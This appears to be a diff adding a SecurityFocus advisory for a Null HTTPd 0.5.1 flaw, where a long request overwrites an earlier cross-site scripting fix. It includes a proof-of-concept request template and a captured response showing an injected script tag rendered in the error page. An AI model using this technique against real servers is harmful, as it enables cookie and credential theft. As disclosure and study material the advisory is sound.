@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/8695/info
+
+It has been reported that Null HTTPd is prone to a cross-site scripting vulnerability when displaying error pages that may allow an attacker to execute HTML or script code in a user's browser. The issue was previously reported and fixed (BID 5603), however an attacker may send a long HTTP request to the software, which may overwrite memory containing the fix for cross-site scripting issue. As a result, an attacker may bypass the check for cross-site scripting and construct a link containing malicious HTML and script code to be rendered in a user's browser upon visiting that link.
+
+Successful exploitation of this issue may allow an attacker to steal cookie-based authentication credentials. Other attacks are also possible.
+
+Null HTTPd version 0.5.1 and prior are reported to be prone to this issue. 
+
+http://www.example.com/ [1799 bytes --needed to avoid XXS] [243 bytes --XXS code]
+
+
+Answer from NULLhttpd:
+
+----
+HTTP/1.0 200 OK
+Cache-Control: no-store
+Connection: Close
+Content-Length: 472
+Date: Tue, 23 Sep 2003 11:39:30 GMT
+Expires: Tue, 23 Sep 2003 11:39:30 GMT
+Last-Modified:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaano-cache
+Pragma: no-cache
+Server: Null httpd 0.5.1
+Content-Type: text/html
+
+<script>alert('hello');</script>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxx<HTML><HEAD><TITLE>400 Bad Request</TITLE></HEAD>
+<BODY BGCOLOR=#F0F0F0 TEXT=#000000 LINK=#0000FF ALINK=#0000FF VLINK=#0000FF>
+<H1>400 Bad Request</H1>
+Can't Parse Request.
+<HR>
+<ADDRESS>Null httpd 0.5.1</ADDRESS>
+</BODY></HTML>
+---- 
